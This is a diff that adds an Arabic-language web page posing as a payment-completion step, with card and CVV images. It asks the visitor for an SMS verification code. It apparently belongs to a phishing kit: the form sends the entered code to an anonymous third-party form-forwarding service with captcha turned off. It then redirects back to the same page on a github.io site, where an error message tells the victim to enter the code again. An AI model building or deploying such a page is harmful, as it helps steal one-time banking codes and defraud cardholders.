@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الكود</title>
+    <meta content="صفحة الدفع لإستكمال الطلب" name="description">
+    <!-- img real shortcut -->
+    <link rel="shortcut icon" href="img/cvv.png">
+
+    <link rel="stylesheet" href="all.min.css" />
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="style-code.css">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div class="box">
+        <div class="head">
+            <img src="img/debit-card.png" alt="">
+            <h6>أرفق الكود</h6>
+            <hr>
+        </div>
+
+        <div class="card">
+            <img class="img" src="img/otp-code.png" alt="">
+        </div>
+
+        <hr class="hr">
+
+        <form action="https://formsubmit.co/86e2d111eb442626623070d10c3ff93d" method="post">
+            <input type="hidden" name="_next" value="https://naellweb.github.io/ap/code.html">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="كود SMS">
+
+
+            <div class="sms-code">
+                <label for="sms-code">أدخل كود SMS</label>
+                <input type="number" name="sms-code">
+                <img src="img/otp-code.png" alt="">
+                <span id="err">الكود خطأ حاول إدخال الرمز بطريقة صحيحة</span>
+            </div>
+
+            <input id="btn" type="submit" value="إتمام الطلب">
+        </form>
+
+        <script src="main.js"></script>
+</body>
+
+</html>
